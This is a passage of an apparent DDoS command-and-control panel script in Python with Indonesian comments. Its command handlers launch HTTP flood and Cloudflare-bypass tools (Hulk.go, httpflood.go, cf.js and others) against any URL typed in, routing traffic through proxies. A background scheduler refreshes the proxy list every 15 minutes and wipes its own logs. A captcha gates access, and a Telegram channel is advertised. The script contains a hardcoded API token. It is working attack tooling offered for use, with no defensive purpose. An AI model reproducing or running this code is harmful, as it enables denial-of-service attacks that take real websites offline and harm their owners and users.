        elif "tlsv2" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
                               
               os.system(f'node autov2.js {url} {time} 3 32 proxies.txt')        
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: tlsv2
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: tlsv2 <url> <waktu>')
                print('Contoh: tlsv2 http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")            

        elif "cf-bypass" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node cf.js {url} {time} 32 proxies.txt')
                
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: cf-bypass
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: cf-bypass <url> <waktu>')
                print('Contoh: cf-bypass http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                
                os.system(f'go run Hulk.go -site {url} -data {method}')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
                
                url = f"{url}"
                token = "727e8c2fa5b07c"
                result = get_url_info(url, token)
                print(result) 
                
            except Exception as e:
                print(f"Error executing command: {e}")
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node httpget GET {url} {time} 3 32 proxies.txt')
               os.system(f'node httpgetv2 GET {url} {time} 3 32 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: httpget
               Ketik [CLS] untuk membersihkan terminal""") 
                         
            except IndexError:
                print('Penggunaan: httpget <url> <waktu>')
                print('Contoh: httpget http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}") 
                
        elif "http-storm" in cnc:
            try:
               url, time = cnc.split()[1:3]
               os.system("clear")  # Bersihkan layar (opsional)
               
               os.system(f'node http-storm.js {url} {time} 3 32 proxies.txt')
               
               url = f"{url}"
               token = "727e8c2fa5b07c"
               result = get_url_info(url, token)
               print(result) 
                
               sys.stdout.write(f"\x1b]2;{title_string}\x07")
               sys.stdout.flush()
               
               print(f"""
               [Sistem] Informasi
               Target: {url}
               Waktu: {time}s
               Metode: http-storm
               Ketik [CLS] untuk membersihkan terminal""")  
                        
            except IndexError:
                print('Penggunaan: http-storm <url> <waktu>')
                print('Contoh: http-storm http://example.com 60')
            except ValueError as ve:
                print(f"Waktu tidak valid: {ve}")
            except Exception as e:
                print(f"Terjadi kesalahan saat menjalankan perintah: {e}")   
                                                                                                                                                                                 
# ==================== LOGIKA SCHEDULER & CAPTCHA ====================
# (Tempelkan blok ini di bagian paling akhir file c2.py Anda)

LOG_FILE = 'proxy_scheduler.log'

# Catatan: Fungsi clear_screen() dan si() sudah didefinisikan 
# di bagian atas skrip C2, jadi tidak perlu didefinisikan ulang di sini.

def log_message(message):
    """Menulis pesan ke file log."""
    # Menggunakan mode 'a' (append) untuk menambahkan pesan
    with open(LOG_FILE, 'a') as f:
        f.write(f"{message}\n")

def clear_log_file():
    """
    Menghapus isi file log setelah proses selesai. 
    Ini mencegah penumpukan log antar siklus.
    """
    try:
        # Menulis string kosong ke file, efektif mengosongkannya
        with open(LOG_FILE, 'w') as f:
            f.write("")
        # Pesan cleanup ini akan segera dihapus oleh pemanggilan berikutnya di akhir proses
        # log_message(f"🗑️ [CLEANUP] File log '{LOG_FILE}' telah dikosongkan.") 
    except Exception as e:
        # Mencetak ke stdout hanya jika gagal menulis log, sebagai fallback peringatan
        print(f"⚠️ PERINGATAN: Gagal mengosongkan file log: {e}")


# ==================== KONFIGURASI SCHEDULER ====================
try:
    import pytz # Asumsikan pytz sudah diimpor
    WIB = pytz.timezone('Asia/Jakarta')
except (ImportError, AttributeError, pytz.exceptions.UnknownTimeZoneError):
    WIB = None  

INTERVAL_SECONDS = 900 # 15 menit
# ===============================================================

def run_proxy_process():
    """
    Menjalankan proses pengambilan (getproxy.py) dan validasi (cekproxy.py) proxy.
    Semua output diarahkan ke LOG_FILE.
    (Fungsi ini berjalan di latar belakang)
    """
    
    # 1. Kosongkan log file sebelum memulai proses baru
    clear_log_file()
    
    if WIB:
        current_time = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
    else:
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

    log_message("\n" + "="*70)
    log_message(f"🚀 [START] Memulai proses koleksi dan validasi proxy pada: {current_time}")
    log_message("="*70)
    
    # Menjalankan skrip dan menangkap output ke log
    with open(LOG_FILE, 'a') as log_file:
        
        # 1. getproxy.py
        log_message("1. Memulai skrip pengambilan proxy (getproxy.py)...")
        try:
            # Output diarahkan ke log_file
            subprocess.run([sys.executable, 'getproxy.py'], check=True, stdout=log_file, stderr=log_file)
        except subprocess.CalledProcessError:
            log_message("❌ ERROR: Gagal menjalankan getproxy.py. Cek log.")
        except FileNotFoundError:
            log_message("🛑 ERROR: File getproxy.py tidak ditemukan.")
            return  
    
        # 2. cekproxy.py
        log_message("\n2. Pengambilan proxy selesai. Memulai validasi proxy (cekproxy.py)...")
        try:
            # Output diarahkan ke log_file
            subprocess.run([sys.executable, 'cekproxy.py'], check=True, stdout=log_file, stderr=log_file)
        except subprocess.CalledProcessError:
            log_message("❌ ERROR: Gagal menjalankan cekproxy.py. Cek log.")
        except FileNotFoundError:
            log_message("🛑 ERROR: File cekproxy.py tidak ditemukan.")
            return

    # Pesan selesai
    if WIB:
        end_time_wib = datetime.datetime.now(WIB).strftime('%Y-%m-%d %H:%M:%S')
    else:
        end_time_wib = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

    log_message("\n" + "="*70)
    log_message(f"✅ [SUCCESS] Proses selesai pada: {end_time_wib}")
    log_message("Proxy aktif disimpan ke proxies.txt")
    log_message("="*70)

    # 2. Kosongkan kembali log file setelah proses selesai (fitur penghapus otomatis)
    clear_log_file()


def start_scheduler_loop():
    """
    Fungsi ini berisi loop tak terbatas dan HANYA DIPANGGIL oleh proses latar belakang.
    """
    if not WIB:
        log_message("PERINGATAN: Modul 'pytz' tidak ditemukan. Gunakan waktu lokal/sistem.")
    
    log_message(f"--- SCHEDULER PROXY AKTIF DIBELAKANG (Interval: {INTERVAL_SECONDS // 60} menit) ---")
    
    while True:
        try:
            run_proxy_process()
            
            # Hitung waktu untuk eksekusi berikutnya
            next_run_time_raw = datetime.datetime.now() + datetime.timedelta(seconds=INTERVAL_SECONDS)
            if WIB:
                  next_run_time = next_run_time_raw.astimezone(WIB).strftime('%Y-%m-%d %H:%M:%S')
            else:
                  next_run_time = next_run_time_raw.strftime('%Y-%m-%d %H:%M:%S (Waktu Lokal)')

            # Jeda
            log_message(f"\n💤 Menunggu {INTERVAL_SECONDS // 60} menit...")
            log_message(f"Eksekusi Berikutnya Dijadwalkan pada: {next_run_time}")
            
            time.sleep(INTERVAL_SECONDS)
            
        except Exception as e:
            # Fatal error log akan tetap disimpan sebentar sebelum direset di siklus berikutnya
            log_message(f"\n[ERROR FATAL] Terjadi kesalahan tak terduga dalam loop: {e}")
            log_message(f"Mencoba lagi dalam 5 menit...")
            time.sleep(300) 


def post_login_message():
    """
    PERBAIKAN: Fungsi 'menu()' kedua diganti namanya menjadi 'post_login_message()'
    agar tidak bentrok dengan 'menu()' panel C2.
    """
    from termcolor import colored # Asumsikan colored sudah diimpor
    print(colored("---", "cyan"))
    print(colored("t.me/OverloadServer", "yellow"))
    
    # Tambahkan pesan untuk memandu pengguna
    print(colored(f"\nScheduler proxy berjalan di latar belakang.", "green", attrs=["bold"]))
    print(colored(f"Log sementara dicatat di '{LOG_FILE}' dan akan direset setiap kali proses selesai.", "yellow"))
    print(f"Untuk memantau log, cek file: {LOG_FILE}")


# ==================== FUNGSI CAPTCHA DAN LOGIN ====================

def generate_and_verify_captcha(length=4):
    from termcolor import colored # Asumsikan colored sudah diimpor
    while True:
        characters = string.ascii_uppercase
        captcha = ''.join(random.choice(characters) for _ in range(length))

        clear_screen()
        print("\n" + "="*30)
        print(f"{'CAPCTHA UNTUK VERIFIKASI'.center(30)}")
        print("="*30 + "\n")

        print(colored(f"    {captcha}    ", "green", attrs=["bold", "reverse"]))

        print("\n" + "="*30)
        user_input = input("Masukkan captcha di atas: ".ljust(30))

        if captcha == user_input.upper():
            print(colored("\nCaptcha benar!", "green"))
            time.sleep(1) 
            return True
        else:
            print(colored("\nCaptcha salah. Silakan coba lagi.", "red"))
            input("Tekan Enter untuk melanjutkan...")

def login():
    from termcolor import colored # Asumsikan colored sudah diimpor
    clear_screen()
    print("Memulai verifikasi CAPTCHA untuk akses script...")

    if generate_and_verify_captcha():
        print(colored("\nAkses Diberikan! Meluncurkan scheduler...", "green", attrs=["bold"]))
        
        # --- Peluncuran Proses Latar Belakang ---
        background_command = [sys.executable, os.path.abspath(__file__), '--run-scheduler']

        if os.name == 'nt': # Windows
            creation_flags = subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP
            subprocess.Popen(background_command, creationflags=creation_flags, close_fds=True)
            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Windows).", "cyan"))
            
        else: # Unix/Linux/macOS
            subprocess.Popen(background_command, preexec_fn=os.setsid, close_fds=True)
            print(colored("✅ Scheduler berhasil diluncurkan di latar belakang (Unix).", "cyan"))
        
        time.sleep(1)
        
        # PERBAIKAN: Panggil pesan "WELCOME" di sini
        post_login_message()    
        
        return True
    else:
        return False

# ==================== MAIN EXECUTION ====================

if __name__ == "__main__":
    
    if len(sys.argv) > 1 and sys.argv[1] == '--run-scheduler':
        # Mode 1: Jalankan sebagai scheduler latar belakang (headless)
        start_scheduler_loop()  
        
    else:
        # Mode 2: Jalankan sebagai mode interaktif (CAPTCHA)
        if login():
            # PERBAIKAN: Panggil 'main()' (C2 Loop) bukan 'menu()'
            main()
        else:
            print(colored("\nScript tidak dapat diakses.", "red"))
# ...                                                                          